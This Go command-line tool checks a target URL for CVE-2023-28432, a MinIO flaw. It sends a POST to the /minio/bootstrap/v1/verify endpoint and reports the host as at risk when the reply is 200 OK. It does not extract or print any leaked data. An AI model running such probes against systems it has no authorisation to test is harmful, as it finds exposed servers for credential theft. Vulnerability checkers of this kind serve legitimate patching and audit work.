package main

import (
	"fmt"
	"github.com/parnurzeal/gorequest"
	"github.com/urfave/cli"
	"os"
	"time"
)

func check(c *cli.Context) error {
	defer func() {
		err := recover()
		if err != nil {
			fmt.Println(time.Now().Format("2006-01-02 15:04:05"), "【http error】", "返回信息:", err)
		}
	}()
	if c.NumFlags() == 0 {
		cli.ShowAppHelpAndExit(c, 0)
	}
	host := c.String("url")
	url := host + "/minio/bootstrap/v1/verify"
	request := gorequest.New()
	resp, _, errs := request.Post(url).
		Set("Content-Type", "application/x-www-form-urlencoded").
		End()
	if errs != nil {
		panic(errs)
	}

	if resp.Status == "200 OK" {
		fmt.Println(time.Now().Format("2006-01-02 15:04:05"), "【存在风险】：", url)
	} else {
		fmt.Println(time.Now().Format("2006-01-02 15:04:05"), "【不存在风险】：", url)
	}
	return nil
}
func main() {
	app := &cli.App{
		Name:        "CVE-2023-28432",
		Description: "CVE-2023-28432 check",
		Action:      check,
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:     "url, u",
				Usage:    "target, eg: \"http://www.example.com\"",
				Required: true,
				Value:    "",
			},
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		fmt.Println("err:", err)
	}

}
